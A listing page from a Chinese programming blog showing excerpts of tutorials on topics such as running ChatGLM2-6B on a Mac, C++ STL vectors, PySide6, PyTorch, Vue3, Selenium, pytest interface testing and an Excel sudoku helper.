<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程大白的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://bcdabai.github.io/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程大白的博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a5adbcbcb9fd79c590d14f6528abc753/" rel="bookmark">
			基于MacBook Pro M1芯片运行chatglm2-6b大模型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1. 参考2. ChatGLM2-6B 介绍3. 本地运行3.1 硬件配置3.2 下载ChatGLM2-6B代码3.3 下载需要加载的模型3.4 运行大模型3.4.1 安装依赖3.4.2 编辑web_demo.py3.4.3 启动 4. 测试 1. 参考 ChatGLM2-6B代码地址chatglm2-6b模型地址Mac M1芯片部署 2. ChatGLM2-6B 介绍 ChatGLM2-6B 是开源中英双语对话模型 ChatGLM-6B 的第二代版本，在保留了初代模型对话流畅、部署门槛较低等众多优秀特性的基础之上，ChatGLM2-6B 引入了如下新特性：
更强大的性能。更长的上下文。更高效的推理。更开放的协议。 详细介绍参考官方README介绍。
3. 本地运行 3.1 硬件配置 芯片：Apple M1 Pro内存：32 GB 3.2 下载ChatGLM2-6B代码 cd /Users/joseph.wang/llm git clone https://github.com/THUDM/ChatGLM2-6B 3.3 下载需要加载的模型 此步骤下载模型需要科学上网，同时需要耐心，因为下载的时间会比较长。
cd /Users/joseph.wang/llm/ChatGLM-6B mkdir model cd model git lfs install git clone https://huggingface.co/THUDM/chatglm2-6b 3.4 运行大模型 3.4.1 安装依赖 cd /Users/joseph.wang/llm/ChatGLM-6B pip install -r requirements.txt 其中 transformers 库版本推荐为 4.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a5adbcbcb9fd79c590d14f6528abc753/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1949782ed45c50711dc210d1e23ce95f/" rel="bookmark">
			STL标准库（二）序列容器之vector
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		vector 动态数组 本质是向量，一个无限续存的连续内存空间
int main()
{
std::vector&lt;int&gt; obj(5); 创建一个容量为5且默认值为0的vector
std::vector&lt;int&gt; obj(5，12138); 创建一个容量为5且默认值为12138的vector
std::cout &lt;&lt; obj.capacity() &lt;&lt; std::endl; 查看当前vector容量
std::cout &lt;&lt; obj.size() &lt;&lt; std::endl;查看当前vector元素个数
for (size_t i = 0; i &lt; obj.size(); i++) 遍历输出vector
{
std::cout &lt;&lt; obj[i] &lt;&lt; std::endl;
}
std::vector&lt;int&gt; obj2(obj); 拷贝obj
for (size_t i = 0; i &lt; obj.size(); i++) 遍历输出obj2元素值
{
std::cout &lt;&lt; obj2[i] &lt;&lt; std::endl;
}
obj[1] = 222; 可以直接对vector元素进行修改
obj.at(2) = 333; 此方法也可进行修改元素
for (size_t i = 0; i &lt; obj.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1949782ed45c50711dc210d1e23ce95f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a8bbe6491f8f516e3948cf3d013f0f53/" rel="bookmark">
			Pyside6在Pycharm下安装和使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一：安装
二：使用
一：安装 打开Pycharm编辑器，file-setting里Python解释器，点击小+号，添加模块，搜索Pyside6,安装
安装报错，可能是默认的库安装超时，用其他的源
pip install Pyside6 -i https://pypi.tuna.tsinghua.edu.cn/simple
安装成功
二：使用 建立一个窗口：
import sys
from PySide6.QtWidgets import QApplication, QMainWindow, QPushButton
class MainWindow(QMainWindow):
def __init__(self):
super().__init__()
self.initUI()
def initUI(self):
self.setWindowTitle('My Window')
self.setGeometry(100, 100, 400, 300)
if __name__ == '__main__':
app = QApplication(sys.argv)
mainWindow = MainWindow()
mainWindow.show()
sys.exit(app.exec_())
在窗口中添加按钮：
import sys
from PySide6.QtWidgets import QApplication, QMainWindow, QPushButton
class MainWindow(QMainWindow):
def __init__(self):
super().__init__()
self.initUI()
def initUI(self):
self.setWindowTitle('My Window')
self.setGeometry(100, 100, 400, 300)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a8bbe6491f8f516e3948cf3d013f0f53/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/72924370d3c3d4772ffacc13cdf305b9/" rel="bookmark">
			c/c&#43;&#43;公交管理系统（星穹轨道可视化EasyX）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		注：全代码由博主个人耗时两个星期开发，实现了基础的公交管理系统功能：1.前端用户查询站点以及查看所有站点。2.后端管理员权限，实现登录系统检验，添加路线以及删除路线。最重要的是使用EasyX实现了星穹轨道的启动以及抽卡界面以及音效。
注意：代码可以直接拿，但是可视化部分的素材需收费（博主做可视化部分就做了一个多星期），需要的可以直接看文章结尾。
话不多说直接上代码：
#define _CRT_SECURE_NO_WARNINGS /*开发日志 * 1.明确公交管理系统分为后台和前台 * 2.前台的主要功能是给用户规划最佳路线 * 3.后台的主要功能是给管理员添加和删除路线使用 * 使用技术： * 1.数据处理 * 1.1去重以及划分路线范围（路线范围后加） * 1.2给每个站点进行编号便于处理 * 2.进行图的建立 * 3.使用Dijkstra算法给出最短路径 * * 日志12-21 准备可视化开发 * 基本核心算法已经就绪 * 12-25开场动画准备完毕，开始进入第二阶段，查询功能判定 * 判断写好了接下来就是最后的输出了 * 遇到困难了，发现无法读取中文 * 好的困难解决将整个程序改为了unioncode字符集完成开发 * 又遇到难点了，怎么在文本框里换行输入啊,算了直接多设置几个控件就好了 * 好的管理员权限开发完毕 * 1-1开始开发使用者权限 * 1-2上午完成查询站点开发，使用了string转为wchar_t*的技术 * * * 与1-2晚上完成开发，完美收工！！！！！！ */ #include&lt;fstream&gt; #include&lt;iostream&gt; #include&lt;map&gt; #include&lt;vector&gt; #include&lt;string&gt; #include&lt;graphics.h&gt; #include&lt;conio.h&gt; #include &lt;Windows.h&gt; #include &lt;mmsystem.h&gt; #pragma comment(lib, "winmm.lib") using namespace std; #define WHIDE 1870 #define HEIGHT 1000 //我们采用邻接表的方式储存数据 typedef struct First_Situation First_Situation; //数组类型 typedef struct situation situation; //小节点 typedef struct graph Graph; //图 typedef struct Road Road; //线路 // 实现文本框控件 class EasyTextBox { private: int left = 0, top = 0, right = 0, bottom = 0;	// 控件坐标 wchar_t* text = NULL;	// 控件内容 size_t maxlen = 0;	// 文本框最大内容长度 public: void Create(int x1, int y1, int x2, int y2, int max) { maxlen = max; text = new wchar_t[maxlen]; text[0] = 0; left = x1, top = y1, right = x2, bottom = y2; // 绘制用户界面 Show(); } ~EasyTextBox() { if (text !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/72924370d3c3d4772ffacc13cdf305b9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/67fe87ad89746ac8dbaed7e5ca24f0f3/" rel="bookmark">
			推荐在线PS修图网页版工具PHP网站源码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在线PS修图网页版工具PHP网站源码，PHP在线照片图片处理PS网站程序源码photoshop网页版。
有很多朋友们都是在用PS作图的，众所周知在使用和学习PS时是需要下载软件的，Photoshop软件对电脑配置也是有一定要求的，今天就为大家带来一款可以实现用浏览器就可以让你在线进行P图和作图的网页在线ps网站源码，用户只需打开网页就可以流畅进行做图，相当方便快捷，并且网页版ps也拥有软件端的大部分功能，有时候编辑一张照片使用网页版比重新安装使用一个PS快的多。
只需要将在线ps源码导入到虚拟主机或服务器中直接打开index.php文件就可以访问网页版ps了，绿色免安装直接在您的浏览器上用它修正，调整和美化您的图像。
演示地 址 ： runruncode.com/php/19680.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b74860d5105afbb9dc15192b7c3cd952/" rel="bookmark">
			超简单的OCR模块：cnocr
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 毫无疑问的是，关于人工智能方向，python真的十分方便和有效。
这里呢，我将介绍python众多OCR模块中一个比较出色的模块：cnocr
模块介绍 cnocr是一个基于PyTorch的开源OCR库，它提供了一系列功能强大的中文OCR模型和工具，可以用于图像中的文字检测、文字识别和文本方向检测等任务。它可以识别各种不同风格和字体的中文文字，包括简体字和繁体字，可根据具体需求在官方文档中查找对应的模型作为参数输入实例化cnocr方法。官方也提供有英文的识别模型，但其他语言就暂时没有更多的模型，但可以根据自己的需要和自己准备的数据集对模型进行训练。
项目地址：https://github.com/breezedeus/CnOCR
demo实例 cnocr的开发目标就是“使用简单”，因此，你仅仅需要一些简单的操作便能够完成ocr工作。
安装基本上无坑，pip直接就装上了
pip install cnocr 这里是一个简单的例子:
这是项目目录，sample.py是demo脚本，images里装着需要识别的图片，outs是处理后的图片：
这是sample.py的代码 from cnocr import CnOcr import cv2 from PIL import Image, ImageDraw, ImageFont FONT_STYLE = ImageFont.truetype("msyhl.ttc", 30, encoding="utf-8") # 图片名称 file_name = 'images/img.png' target_name = 'outs/img.png' ocr = CnOcr() result = ocr.ocr(file_name) # 将ocr识别的内容、以及具体位置打包成字典 txts = [] for re in result: # print(re['position'][0]) # print(type(re['position'][0])) txts.append([re['text'], [re['position'][2], re['position'][0]]]) # 创建一个可以在给定图像上绘图的frame对象 frame = cv2.imread(file_name) for tt in txts: # text是识别出来的文字 text = tt[0] # site是他的矩形识别图形的起点、终点列表 # 样式为[[起始点x轴坐标, 起始点y轴坐标], [终点x轴坐标, 终点y轴坐标]] site = tt[1] print(text, site) cv2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b74860d5105afbb9dc15192b7c3cd952/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/da0d5253a31562cae04fc58b27e2fdcd/" rel="bookmark">
			pytorch学习笔记（十一）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		优化器学习 把搭建好的模型拿来训练，得到最优的参数。
import torch.optim import torchvision from torch import nn from torch.nn import Sequential, Conv2d, MaxPool2d, Flatten, Linear from torch.utils.data import DataLoader dataset = torchvision.datasets.CIFAR10("../data", train=False, transform=torchvision.transforms.ToTensor(), download=True) dataloader = DataLoader(dataset, batch_size=1) class Tudui(nn.Module): def __init__(self): super(Tudui, self).__init__() self.model1 = Sequential( Conv2d(3, 32, 5, padding=2), MaxPool2d(2), Conv2d(32, 32, 5, padding=2), MaxPool2d(2), Conv2d(32, 64, 5, padding=2), MaxPool2d(2), Flatten(), Linear(1024, 64), Linear(64, 10) ) def forward(self, x): x = self.model1(x) return x #定义loss loss = nn.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/da0d5253a31562cae04fc58b27e2fdcd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e8763ae8b41afd31dc4f7475fc063859/" rel="bookmark">
			java 面向对象特征：继承(Inheritance)（概念、代码、图示）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2.1 继承的概述 2.1.1 生活中的继承 绿化：前人栽树，后人乘凉
“绿水青山，就是金山银山”
样貌：
继承之外，是不是还可以"进化"： 2.1.2 Java中的继承 角度一：从上而下
为描述和处理个人信息，定义类Person：
为描述和处理学生信息，定义类Student：
角度二：从下而上
多个类中存在相同属性和行为时，将这些内容抽取到单独一个类中，那么多个类中无需再定义这些属性和行为，只需要和抽取出来的类构成继承关系。如图所示：
再举例： 2.1.3 继承的好处 继承的出现减少了代码冗余，提高了代码的复用性。
继承的出现，更有利于功能的扩展。
继承的出现让类与类之间产生了is-a的关系，为多态的使用提供了前提。
继承描述事物之间的所属关系，这种关系是：is-a 的关系。可见，父类更通用、更一般，子类更具体。
注意：不要仅为了获取其他类中某个功能而去继承！
2.2 继承的语法 2.2.1 继承中的语法格式 通过 extends 关键字，可以声明一个类B继承另外一个类A，定义格式如下：
[修饰符] class 类A { ... } [修饰符] class 类B extends 类A { ... } 2.2.2 继承中的基本概念 类B，称为子类、派生类(derived class)、SubClass
类A，称为父类、超类、基类(base class)、SuperClass
2.3 代码举例 1、父类
/* * 定义动物类Animal，做为父类 */ public class Animal { // 定义name属性 String name; // 定义age属性 int age; // 定义动物的吃东西方法 public void eat() { System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e8763ae8b41afd31dc4f7475fc063859/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5c985e50d7698535cdea12c2944c823e/" rel="bookmark">
			接口自动化测试：pytest基础讲解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		为什么要做接⼝测试？ 只靠前端测试很难确保很⾼的覆盖率。接⼝测试，可以模拟出各种类型的⼊参，包括⼀些在前端模拟不出来的⼊参，还能根据接⼝⽂档的定义，设计出相对完善的⼊参值，在接⼝层保证质量，剩余的绝⼤多数问题就是应⽤程序⾃⾝的交互和数据展⽰问题。
接⼝测试相对于交互界⾯测试和功能测试来说，更容易实现⾃动化，执⾏起来⽐较稳定，维护成本也⽐较低。
接⼝⾃动化适⽤于回归测试、线上接⼝巡检等，可以减少⼈⼯回归测试的⼈⼒成本、也可以监控线上接⼝健康情况。
前、后端系统分离，从安全层⾯来说，只依赖前端进⾏不能满⾜安全要求，绕过前端相对容易，所以需要后端同样进⾏输⼊校验，可以依赖接⼝测试去验证了。
⼀、接⼝测试流程 1. 如何测试接⼝ ？
怎么测试接⼝？根据什么来测接⼝呢？这就需要开发提供的接⼝⽂档了，接⼝⽂档和功能测试的需求说明书的功能是⼀样的。包括：接⼝说明、调⽤的url，请求⽅式（Get or Post orRPC协议的框架，Doubbo接⼝协议），请求参数、参数类型、请求参数说明，返回结果说明。有了接⼝⽂档后，我们就可以设计接⼝测试⽤例，⼀般接⼝测试的⽤例编写可以从以下⼏个⽅⾯进⾏：
2. 接⼝⿊盒⽩盒的测试⽅法
◦ 接⼝通过性验证（最基本的）
▪ 传递正确的参数，是否返回正确的结果。
◦ 参数组合验证
▪ 因为参数有必传和⾮必传，
▪ 参数的类型和⻓度，
▪ 以及传递时可能业务上的⼀些限制，
▪ 测试参数的排列组合，保证所有的情况都能覆盖到，
◦ 接⼝的安全性&amp;异常验证
例如绕过验证，⽐如提交订单时，在传递商品价格参数时，修改商品价格，看后端是否做了校验，或者⽀付时，修改订单⾦额，如果能以改之后的⾦额⽀付，这个接⼝就是有问题了。
绕过⾝份验证，就是某个功能只有特殊权限的⽤⼾才能操作，那我穿⼀个普通的⽤⼾，是不是也能操作。
参数是否加密，这个关系到⼀些账号的安全，⽐如我们登录⼀些⽹站时，他要将我们的登录信息进⾏加密。
▪ 密码安全规则，设置密码时复杂程度的校验。
▪ 订单幂等的校验，两个同⼀订单号的订单是否能提交⽀付
▪ 修改⽀付订单的⽀付状态
▪ 异常测试（try catch测试）
▪ 逻辑或、逻辑与的测试
▪ 接⼝参数边界测试0和负数 还有int最⼤值等等；
◦ 根据业务逻辑来设计⽤例
▪ 符合业务逻辑的意思是指，此接⼝包含了这个功能逻辑的所有应⽤场景；
▪ 与其他业务接⼝业务的组合，排除对其他业务的影响；
3. 测试分析
◦ 接⼝测试范围&amp;优先级
◦ 独⽴接⼝测试分析
◦ 联调接⼝测试分析
◦ 接⼝测试框架分析
◦ 涉及到问题：
▪ 没有接⼝测试设计⽂档怎么办
▪ 接⼝设计⽂档⾮常粗糙怎么办
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5c985e50d7698535cdea12c2944c823e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/23f3017cbfbb78f4034485398f521767/" rel="bookmark">
			[数据结构]顺序表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、顺序表的概念及结构 1.1 线性表 线性表（ linear list ）是n个具有相同特性的数据元素的有限序列。 线性表是⼀种在实际中广泛使用的数据结构，常见的线性表：顺序表、链表、栈、队列、字符串... 线性表在逻辑上是线性结构，也就说是连续的⼀条直线。但是在物理结构上并不⼀定是连续的， 线性表在物理上存储时，通常以数组和链式结构的形式存储。 案例：蔬菜分为绿叶类、⽠类、菌菇类。线性表指的是具有部分相同特性的⼀类数据结构的集合 2、顺序表分类 2.1顺序表和数组的区别 顺序表的底层结构是数组，对数组的封装，实现了常用的增删改查等接⼝ 2.2顺序表分类 1.静态顺序表: 概念：使用定长数组存储元素
代码示例：
typrdef int SLDataType; #define N 8 typedef struct SeqList { SLDataType a[N];//定长数组 int size; //有效数据个数 }SL; 这就是一个静态顺序表，它又一定的缺陷。
容易出现：空间给少了不够用，给多了造成空间浪费 2.动态顺序表 它的特点是：按需申请
3.动态顺序表的实现 我们首先创建相应的头文件和程序文件
我们现在头文件中，引用头文件，定义所需要的结构体和函数
#include&lt;stdio.h&gt; #include&lt;assert.h&gt; #include&lt;stdlib.h&gt; typedef int SLDataType; typedef struct SeqList { SLDataType* arr; //存储数据的底层结构 int capacity; //记录顺序表的空间大小 int size; //记录顺序表当前有效的数据个数 }SL; //初始化： void SLInit(SL* ps); //销毁 void SLDestroy(SL* ps); //顺序表的头部 / 尾部插入 void SLPushFront(SL* ps, SLDataType x); void SLPushBack(SL* ps, SLDataType x); //顺序表的头部 / 尾部删除 void SLPopBack(SL* ps); void SLPopFront(SL* ps); //打印 void SLPrint(SL* ps); //删除指定位置的值 void SLInsert(SL* ps, int pos, SLDataType x); void SLErase(SL* ps, int pos); 我们先定义一个动态顺序表
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/23f3017cbfbb78f4034485398f521767/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a8cf9014e64f000ee17cc2ec3dba8721/" rel="bookmark">
			QT获取本机网络信息
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		QT获取本机网络信息 widget.h
#ifndef WIDGET_H #define WIDGET_H #include &lt;QWidget&gt; QT_BEGIN_NAMESPACE namespace Ui { class Widget; } QT_END_NAMESPACE class Widget : public QWidget { Q_OBJECT public: Widget(QWidget *parent = nullptr); ~Widget(); void getinformation(); private slots: void on_pushButton_info_clicked(); private: Ui::Widget *ui; }; #endif // WIDGET_H widget.cpp
#include "widget.h" #include "ui_widget.h" #include&lt;QHostInfo&gt; #include&lt;QNetworkInterface&gt; #include&lt;QMessageBox&gt; Widget::Widget(QWidget *parent) : QWidget(parent) , ui(new Ui::Widget) { ui-&gt;setupUi(this); getinformation(); } Widget::~Widget() { delete ui; } void Widget::on_pushButton_info_clicked() { QString detail = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a8cf9014e64f000ee17cc2ec3dba8721/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d88777babd95a6dbed1f70998e546cb4/" rel="bookmark">
			Vue3的ref和reactive
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1、ref的基本使用
2、reactive的基本使用
3、ref操作dom
4、ref与reactive的异同
1、ref的基本使用 ref创建数据可以是基本类型也可以是引用类型
ref函数创建响应式数据，返回值是一个对象
模版中使用ref数据,省略.value，js代码中不能省略
获取ref创建数据的值要加上.value
&lt;script setup&gt; // ref函数创建响应式数据，返回值是一个对象 // 模版中使用ref数据,省略.value，js代码中不能省略 import { ref } from 'vue' const obj =ref({ name: '北京', desc: '政治文化中心' }) // 修改城市的方法 const change = () =&gt; { obj.value.name = '上海' } &lt;/script&gt; &lt;template&gt; &lt;div&gt;Hello Vue3&lt;/div&gt; &lt;p&gt;城市 {{ obj.name }}&lt;/p&gt; &lt;button @click="change"&gt;修改城市&lt;/button&gt; &lt;/template&gt; &lt;style scoped&gt;&lt;/style&gt; 2、reactive的基本使用 reactive创建响应式
reactive函数创建响应式数据，只支持引用数据类型
使用reactive响应式数据的时候，不需要.value
&lt;script setup&gt; // reactive函数创建响应式数据，只支持引用数据类型 // 使用reactive响应式数据的时候，不需要.value import { reactive } from 'vue' const user = reactive({ name: 'admin', pwd: '123456' }) const changeUserName = () =&gt; { user.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d88777babd95a6dbed1f70998e546cb4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a02778affd63e1143247fdec0517a425/" rel="bookmark">
			Python3&#43;Selenium框架搭建
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Webdriver概述
Webdriver (Selenium2）是一种用于Web应用程序的自动测试工具，
Thoughtworks公司一个强大的基于浏览器的开源自动化测试工具，通常用来编写web应用的自动化测试。
Selenium 是一个用于Web应用程序测试的工具。
Selenium测试直接运行在浏览器中，就像真正的用户在操作浏览器一样。
①提高测试执行效率，节约时间成本
②自动化测试脚本可以重复利用
③可以减少兼容性测试和回归测试的工作量
Selenium常见的有三个版本 Selenium1.0 Selenium2.0 Selenium3.0
支持浏览器 Firefox 火狐浏览器 （FirefoxDriver）驱动
Chrome 谷歌（ChromeDriver）
IE（InternetExplorerDriver）
· Opera（OperaDriver）
· safari（SafariDriver）
语言也兼容很多种、JAVA、Python、C、PHP等
Selenium基于Python语言环境搭建
一、安装selenium 、在Dos窗口中安装 windows + R 输入cmd
查看之前电脑是否安装了selenium 命令 pip list
有自己安装 pip install selenium == XXX 指定版本号、不指定就安装最新版本
有、先卸载、再安装其他版本 pip uninstall selenium
查看安装的版本 pip show selenium
二、在pycharm中导入selenium 库
三、使用哪个浏览器、需要下载对应版本的驱动
FireFox 48以上版本:Selenium 3.X +FireFox驱动—geckodriver注意对应版本号
注意对应版本的浏览器驱动应放在python和浏览器的安装目录内否则会报错
找不到相关path的驱动路径
浏览器驱动环境变量配置：Firefox浏览器驱动geckodriver.exe–v0.22
注：将浏览器驱动放到Python安装路径的根目录(Python已经配置环境变量)
注意: 打开pycharm 不能使用虚拟环境 、使用这个
四、第一个自动化测试脚本
·启动火狐浏览器，
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a02778affd63e1143247fdec0517a425/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/39af6878bd9451c50e7da2c9b659999a/" rel="bookmark">
			【技术预研】starRocks高性价比替换hbase
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		hbase作为类列数据库，更准确说是列族数据库。本质上是一个文件查询系统，追求极限的写入和读取。
而starRocks作为olap数据库，在保持优秀的关联计算能力的前提下，还有不错的查询效率，当然和hbase本身比还有一定差距。
但对于一般场景还是可以接受的，毕竟要省掉很多的资源。与hdfs等组件解耦，降低运维压力。
starRock通过以下三个优化来提升性能：
排序键 相当于在存储的时候，选择某一列或者某几列作为排序键，这样在数据存储的时候就按照这个顺序存放。
在数据查询的时候，可以按照顺序去查询。
前缀索引 有了排序键，但如果数据量大，且查询的内容比较少的话，对内存的压力就很大。
其实可以考虑跳过很多不需要查询的内容。这就有了前缀索引（clickhouse中有类似的稀疏索引）。
就相当于排序键的索引，每隔一定条数记录（1024条），抽出第一条作为前缀索引，这样需要加载到内存的数据就是原来的1/1024。大大降低了内存压力。
bitMap bitMap相当于额外增加了对单个字段的索引。主要是针对枚举值比较少的场景。
例如：性别这个字段，基本上只有男、女、保密、不确定等有限个字段，将这四种枚举值转换为bit数组。再过滤的时候直接进行位运算，那么那么读取数据的时候，只会拉取满足条件的数据。
参考文档 面对百亿数据，Hbase为什么查询速度依然非常快？ - 墨天轮
排序键和前缀索引 | StarRocks
Bitmap 索引 | StarRocks
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6ffb0828edd24453c242ea2810439f3a/" rel="bookmark">
			QGraphicsView前有QWidget遮罩，导致QGraphicsItem鼠标事件不响应
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		场景：在一个QWidget上放置了一个QGraphicsView用于显示图像，QGraphicsView设置了场景，并添加了一个自定义QGraphicsItem。由于需求原因，又绘制了一个标尺QWidget放在QGraphicsView前部。
结果导致标尺QWidget显示时，重写的QGraphicsItem鼠标事件怎么都不响应，设置setAcceptedMouseButtons(Qt::LeftButton);也不管用。除非将标尺QWidget隐藏。
最后通过给标尺QWidget设置以下属性解决：
setAttribute(Qt::WA_TransparentForMouseEvents); 如果当前要求某个QWidget不透明，但又需要其鼠标能够穿透。可以通过该语句达到效果
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2f030f587f1253b9ab2b9f6e0eaf22bc/" rel="bookmark">
			用LED数码显示数字5
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		#include&lt;reg51.h&gt; // 包含51单片机寄存器定义的头文件
void main(void)
{
P2=0xfe; //P2.0引脚输出低电平，数码显示器接通电源准备点亮
P0=0x92; //让P0口输出数字"5"的段码92H
}
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fbf1f3a57cccffade9fa88fa63e3fb13/" rel="bookmark">
			全球 IPv4 耗尽，下月开始收费！开发者尝试迁移：IPv6 是一场“灾难”，没有可以直接用的东西...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		编译 | 苏宓 出品 | CSDN（ID：CSDNnews）
IPv4 即将迎来付费时代：
去年 7 月，亚马逊云科技宣布自 2024 年 2 月 1 日起，所有公共 IPv4 地址将按每小时 0.005 美元的价格收费，约合每月 4 美元，而且无论其是否附加到服务中，都要收费；
基于容器的部署平台 Fly.io 也在不久前更新社区公告，称会在 2 月 1 日之后，对每个专用 IPv4 每月收取约 2 美元的费用；
开源数据处理服务平台 Supabase 计划推出一个 IPv4 的付费附加服务，每月费用为 4 美元。
随着时间一天天临近，围绕「IPv4 收费，迁移到 IPv6」的讨论愈发激烈。
近日，开源数据处理服务平台 Supabase CEO 兼联合创始人 Paul Copplestone 也发起一则关于“做好准备，IPv6 即将到来”的呼吁。然而，由于 IPv4 讯息和 IPv6 讯息标头有很大不同，因此这两种协议无法互操作，同时升级到 IPv6 之路也面临多重挑战，甚至在有开发者进行了尝试使用，最终得出一个结论：IPv6 是一场“灾难”，我们未来虽可以解决困难，但目前准备仍然不足。
全球 IPv4 地址消耗殆尽，升级到 IPv6 提上日程 众所周知，随着互联网的不断发展，设备的数量急剧增加，导致 2019 年负责英国、欧洲、中东和部分中亚地区互联网资源分配的欧洲网络协调中心（RIPE NCC）无奈宣布，其最后的 IPv4 地址空间储备池在 2019 年 11 月 25 日 UTC + 1 15:35 完全耗尽，全球 42 亿个 IPv4 地址已分配完毕。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fbf1f3a57cccffade9fa88fa63e3fb13/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a9e9da6ba2b30c95a87ae712abc2de2f/" rel="bookmark">
			用Excel辅助做数独
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		做数独游戏的时候，画在纸上很容易弄花眼，所以我考虑用Excel辅助做一个。
界面如下：
按下初始化表格区域按钮，会在所有单元格中填充“123456789”。如下图：
当某个单元格删除得只剩一个数字时，会将同一行、同一列和同一区域的其它单元格中的相同数字删除。如下图：
实现上述效果的VBA如下：
1、初始化按钮的代码：
Sub startup_Click() Dim row%, col% For row = 1 To 9 For col = 1 To 9 Cells(row, col) = "'123456789" Next Next End Sub 以上代码仅仅简单遍历相关单元格并填充字符串。
实现自动删除关联单元格中的数字的功能的代码放在工作表的Worksheet_Change事件中，这样，只要修改相关游戏区域中的单元格，就会自动执行检查并删除有关数字。代码如下：
